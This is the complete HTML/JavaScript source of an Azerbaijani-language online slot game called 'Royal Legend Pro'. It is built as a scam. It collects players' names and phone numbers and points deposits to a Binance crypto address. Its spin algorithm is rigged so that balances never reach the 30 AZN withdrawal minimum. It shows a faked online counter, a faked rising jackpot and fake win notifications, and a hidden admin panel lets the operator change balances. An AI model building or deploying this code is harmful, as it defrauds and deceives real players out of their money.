<!DOCTYPE html>
<html lang="az">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Royal Legend Pro</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body { background: #0b1118; color: #fff; font-family: 'Segoe UI', sans-serif; overflow: hidden; height: 100vh; }
        .neon-text { text-shadow: 0 0 10px #00d2ff, 0 0 20px #9d50bb; }
        .glass { background: rgba(255, 255, 255, 0.07); backdrop-filter: blur(15px); border: 1px solid rgba(255,255,255,0.1); border-radius: 20px; }
        
        /* Meyvə Çarxları - Realist Animasiya */
        .slot-window { height: 120px; overflow: hidden; background: #000; border: 2px solid #9d50bb; border-radius: 12px; position: relative; }
        .reel { position: absolute; width: 100%; top: 0; transition: top 2.5s cubic-bezier(0.1, 0, 0.1, 1); display: flex; flex-direction: column; align-items: center; }
        .symbol { height: 120px; display: flex; align-items: center; justify-content: center; font-size: 3rem; }

        /* Arxa fonda Manat yağışı */
        .manat { position: fixed; top: -50px; color: #2ecc71; font-weight: bold; font-size: 20px; z-index: -1; animation: fall linear infinite; opacity: 0.6; }
        @keyframes fall { to { transform: translateY(105vh) rotate(360deg); } }

        /* Bildirişlər */
        #notif-area { position: fixed; left: 10px; bottom: 80px; z-index: 100; }
        .win-notif { background: rgba(0,0,0,0.8); color: #f1c40f; padding: 8px 15px; border-radius: 20px; margin-top: 5px; font-size: 12px; border-left: 3px solid #f1c40f; animation: slideIn 0.5s ease-out; }
        @keyframes slideIn { from { transform: translateX(-100%); } to { transform: translateX(0); } }

        /* Böyük Uduş Atəşfəşanlığı */
        .gold-coin { position: fixed; bottom: -50px; font-size: 30px; z-index: 200; animation: erupt 2s ease-out forwards; }
        @keyframes erupt { to { transform: translateY(-100vh) translateX(var(--x)); opacity: 0; } }
    </style>
</head>
<body>

    <div id="login-screen" class="fixed inset-0 bg-black z-[500] flex items-center justify-center p-6">
        <div class="glass p-8 w-full max-w-sm text-center">
            <h2 class="text-3xl font-bold mb-6 neon-text">Xoş Gəldiniz!</h2>
            <input type="text" id="u_name" placeholder="Adınız" class="w-full p-4 mb-4 bg-gray-900 border border-purple-500 rounded-xl outline-none">
            <input type="tel" id="u_phone" placeholder="Nömrəniz" class="w-full p-4 mb-6 bg-gray-900 border border-purple-500 rounded-xl outline-none">
            <button onclick="enterGame()" class="w-full bg-blue-600 p-4 rounded-xl font-bold text-xl">OYUNA GİR</button>
        </div>
    </div>

    <div class="p-4 flex justify-between items-start relative z-50">
        <div>
            <h1 class="text-xl font-bold neon-text">ROYAL LEGEND PRO</h1>
            <p class="text-xs text-green-400">🟢 Hazırda <span id="online-counter">5,000</span> nəfər onlayndır</p>
        </div>
        <div class="text-right">
            <p class="text-yellow-500 font-black text-sm uppercase">Jackpot</p>
            <p id="jackpot" class="text-2xl font-bold text-white italic">50000.00 AZN</p>
            <span onclick="openAdmin()" class="cursor-pointer text-xl mt-2 block">🛑</span>
        </div>
    </div>

    <div class="container mx-auto px-4 mt-4">
        <div class="glass p-6 text-center shadow-2xl">
            <p class="text-lg mb-4 text-gray-300">Balansınız: <span id="balance" class="text-green-400 font-bold text-2xl">0.00</span> AZN</p>
            
            <div class="grid grid-cols-4 gap-2 mb-6">
                <div class="slot-window"><div id="r1" class="reel"></div></div>
                <div class="slot-window"><div id="r2" class="reel"></div></div>
                <div class="slot-window"><div id="r3" class="reel"></div></div>
                <div class="slot-window"><div id="r4" class="reel"></div></div>
            </div>

            <input type="number" id="bet" value="1" class="w-full p-4 bg-gray-900 border-2 border-purple-600 rounded-2xl mb-4 text-center text-xl font-bold outline-none">
            <button id="spin-btn" onclick="handleSpin()" class="w-full bg-gradient-to-r from-blue-600 to-purple-700 p-5 rounded-2xl font-black text-2xl shadow-lg active:scale-95 transition">FIRLAT! 🎰</button>
        </div>

        <div class="flex flex-col gap-3 mt-6">
            <button onclick="withdraw()" class="bg-red-600 p-4 rounded-full font-bold uppercase shadow-lg">Pul Çıxar</button>
            <button onclick="window.location.href='https://www.tiktok.com/@elcan.alzade3'" class="border-2 border-white p-4 rounded-full font-bold uppercase">Tiktok Destek</button>
            <button onclick="showBinance()" class="bg-orange-500 p-4 rounded-full font-bold text-black uppercase shadow-lg">Binance Depozit</button>
        </div>
    </div>

    <div id="notif-area"></div>

    <div id="admin-panel" class="fixed inset-0 bg-gray-900 z-[600] hidden p-6 overflow-y-auto">
        <div class="flex justify-between items-center mb-8"><h2 class="text-2xl font-bold text-red-500">ADMIN NƏZARƏT</h2><button onclick="closeAdmin()" class="text-3xl">×</button></div>
        <div id="user-list" class="space-y-4"></div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.0.0/firebase-app.js";
        import { getDatabase, ref, set, onValue, update } from "https://www.gstatic.com/firebasejs/9.0.0/firebase-database.js";

        const firebaseConfig = {
            apiKey: "AIzaSyBKGAVyVRnkTLgcv8c1D3G_HRwA8GwgcmQ",
            authDomain: "royal-legend-pro-574d5.firebaseapp.com",
            databaseURL: "https://royal-legend-pro-574d5-default-rtdb.firebaseio.com",
            projectId: "royal-legend-pro-574d5",
            storageBucket: "royal-legend-pro-574d5.firebasestorage.app",
            messagingSenderId: "696766803882",
            appId: "1:696766803882:web:859289afc952838c58c5d3"
        };

        const app = initializeApp(firebaseConfig);
        const db = getDatabase(app);
        const symbols = ['🍒', '🍋', '💎', '7', '💰', '🎰', '🔔'];
        let user = null;
        let isBoosted = false; // Plan 2 üçün

        // Reels Hazırlanması
        document.querySelectorAll('.reel').forEach(r => {
            for(let i=0; i<30; i++) r.innerHTML += `<div class="symbol">${symbols[Math.floor(Math.random()*symbols.length)]}</div>`;
        });

        window.enterGame = () => {
            const name = document.getElementById('u_name').value;
            const phone = document.getElementById('u_phone').value;
            if(!name || !phone) return;

            user = { id: 'u_' + Date.now(), name, phone, balance: 5.00 };
            document.getElementById('login-screen').style.display = 'none';
            set(ref(db, 'users/' + user.id), user);
            initSync();
            startManatRain();
            startJackpot();
            startOnlineCounter();
            startFakeWins();
        };

        function initSync() {
            onValue(ref(db, 'users/' + user.id), (snap) => {
                const data = snap.val();
                if(data.balance > user.balance) isBoosted = true; // Əgər balans artıbsa Plan 2 aktiv olur
                user.balance = data.balance;
                document.getElementById('balance').innerText = user.balance.toFixed(2);
            });
        }

        window.handleSpin = () => {
            let betAmt = parseFloat(document.getElementById('bet').value);
            if(betAmt < 1 || betAmt > user.balance) return alert("Balans yetərsiz!");

            const btn = document.getElementById('spin-btn');
            btn.disabled = true;

            // Çarxları fırlat
            document.querySelectorAll('.reel').forEach((r, i) => {
                r.style.transition = 'none';
                r.style.top = '0px';
                setTimeout(() => {
                    r.style.transition = `top ${2 + (i*0.2)}s cubic-bezier(0.1, 0, 0.1, 1)`;
                    r.style.top = '-2400px';
                }, 50);
            });

            setTimeout(() => {
                let win = 0;
                // ALQORİTM: Plan 1 (Yeni oyunçu)
                if(!isBoosted && user.balance < 20) {
                    win = Math.random() < 0.7 ? betAmt * 1.5 : 0;
                } 
                // ALQORİTM: Plan 2 (Admin pul vurandan sonra)
                else if(isBoosted) {
                    if(user.balance < 29) {
                        win = Math.random() < 0.6 ? betAmt * 1.3 : 0;
                    } else {
                        win = 0; // 30-a əsla çatmasın
                    }
                } else {
                    win = 0; // Balans 0-a doğru
                }

                user.balance = (user.balance - betAmt) + win;
                update(ref(db, 'users/' + user.id), { balance: user.balance });
                if(win > 0) triggerGoldRain();
                btn.disabled = false;
            }, 3000);
        };

        // Effektlər
        function startManatRain() {
            setInterval(() => {
                let m = document.createElement('div');
                m.className = 'manat';
                m.innerText = '₼';
                m.style.left = Math.random() * 100 + 'vw';
                m.style.animationDuration = (Math.random() * 2 + 2) + 's';
                document.body.appendChild(m);
                setTimeout(() => m.remove(), 4000);
            }, 300);
        }

        function triggerGoldRain() {
            for(let i=0; i<40; i++) {
                let c = document.createElement('div');
                c.className = 'gold-coin';
                c.innerText = '💰';
                c.style.left = '50%';
                c.style.setProperty('--x', (Math.random()*400 - 200) + 'px');
                document.body.appendChild(c);
                setTimeout(() => c.remove(), 2000);
            }
        }

        function startJackpot() {
            let val = 50000.00;
            setInterval(() => {
                val += Math.random() * 0.05;
                document.getElementById('jackpot').innerText = val.toFixed(2) + " AZN";
            }, 1000);
        }

        function startOnlineCounter() {
            let count = 4839;
            setInterval(() => {
                count += Math.floor(Math.random() * 11) - 5;
                document.getElementById('online-counter').innerText = count.toLocaleString();
            }, 3000);
        }

        function startFakeWins() {
            const fakeNames = ["Elvin", "Samir", "Aysel", "Rauf", "050***44", "070***21"];
            setInterval(() => {
                let n = document.createElement('div');
                n.className = 'win-notif';
                n.innerText = `${fakeNames[Math.floor(Math.random()*fakeNames.length)]} indicə ${Math.floor(Math.random()*300)+50} AZN qazandı!`;
                document.getElementById('notif-area').appendChild(n);
                setTimeout(() => n.remove(), 5000);
            }, 8000);
        }

        // Admin & Digər
        window.openAdmin = () => {
            document.getElementById('admin-panel').style.display = 'block';
            onValue(ref(db, 'users'), (snap) => {
                let html = '';
                const users = snap.val();
                for(let id in users) {
                    html += `<div class="p-4 glass mb-2 flex justify-between items-center">
                        <div><b>${users[id].name}</b><br><small>${users[id].phone}</small><br><span class="text-green-400">${users[id].balance.toFixed(2)} AZN</span></div>
                        <div class="flex gap-2">
                            <button onclick="changeBal('${id}', 10)" class="bg-blue-600 px-3 py-1 rounded">+10</button>
                            <button onclick="changeBal('${id}', -10)" class="bg-red-600 px-3 py-1 rounded">-10</button>
                        </div>
                    </div>`;
                }
                document.getElementById('user-list').innerHTML = html;
            });
        };

        window.changeBal = (id, amt) => {
            update(ref(db, `users/${id}`), { balance: Math.max(0, user.balance + amt) });
        };

        window.closeAdmin = () => document.getElementById('admin-panel').style.display = 'none';

        window.showBinance = () => {
            navigator.clipboard.writeText("TJQbpsPqD9up2iwHUCLZHDxs1g67uq3mrQ");
            alert("Binance ID Kopyalandı: TJQbpsPqD9up2iwHUCLZHDxs1g67uq3mrQ");
        };

        window.withdraw = () => {
            if(user.balance < 30) alert("Minimum çıxarış 30 AZN-dir!");
            else alert("Tələbiniz göndərildi. 24 saat ərzində yüklənəcək.");
        };
    </script>
</body>
</html>
